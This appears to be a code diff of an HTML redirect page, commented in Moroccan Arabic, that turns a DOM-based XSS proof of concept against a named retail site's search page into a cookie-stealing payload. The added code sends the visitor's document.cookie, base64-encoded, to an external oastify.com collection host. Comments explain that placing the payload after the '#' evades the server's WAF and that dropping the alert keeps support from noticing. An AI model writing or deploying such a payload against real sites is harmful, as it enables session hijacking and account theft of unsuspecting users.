@@ -1,11 +1,17 @@
-<script>
-    // غادي نحطو السم (Payload) مورا الـ # باش السيرفر ما يشوفوش وما يبلكيهش
-    // والـ XSS ديالنا غادي يقرا راسو براسو من الـ URL
-    
-    let xssPayload = "alert(document.domain)";
-    
-    // هاد الرابط كيهرب من الـ WAF حيت الكود كاين مورا الـ #
-    let target = "https://www.decathlon.com/search?q=test#<svg/onload=" + xssPayload + ">";
-    
-    window.location.href = target;
-</script>
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Redirecting...</title>
+</head>
+<body>
+    <script>
+        // الكود اللي غيسحب الداتا بلا alert باش الـ Support ما يعيق بوالو
+        let exfiltrate = "fetch('https://z66h4nv8uyupc4te2u8dlwqpkgq7ez2o.oastify.com/?data='+btoa(document.cookie))";
+        
+        // استعملنا الـ Hash (#) حيت هو اللي لقينا فيه الثقب
+        let finalTarget = "https://www.decathlon.com/search?q=test#<svg/onload=" + exfiltrate + ">";
+        
+        window.location.href = finalTarget;
+    </script>
+</body>
+</html>
